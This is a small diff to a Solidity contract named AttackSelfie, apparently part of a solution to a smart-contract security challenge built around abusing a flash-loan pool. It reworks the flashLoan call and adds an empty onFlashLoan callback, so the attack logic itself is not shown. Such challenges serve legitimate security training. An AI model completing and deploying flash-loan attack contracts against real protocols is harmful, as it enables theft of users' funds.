@@ -54,6 +54,19 @@ contract AttackSelfie is IERC3156FlashBorrower {
             player
         );
 
-        pool.flashLoan(this, address(token), amount, data);
+        pool.flashLoan(
+            IERC3156FlashBorrower(address(this)), 
+            address(token), 
+            amount, 
+            data
+        );
     }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 _amount,
+        uint256,
+        bytes calldata data
+    ) external returns (bytes32) {}
 }
